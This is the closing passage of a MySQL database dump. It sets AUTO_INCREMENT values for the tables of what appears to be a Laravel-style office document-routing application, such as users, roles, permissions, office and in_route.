-- AUTO_INCREMENT for table `externals`
--
ALTER TABLE `externals`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `ex_route`
--
ALTER TABLE `ex_route`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `internals`
--
ALTER TABLE `internals`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `in_route`
--
ALTER TABLE `in_route`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `office`
--
ALTER TABLE `office`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `personnel`
--
ALTER TABLE `personnel`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `uploads`
--
ALTER TABLE `uploads`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
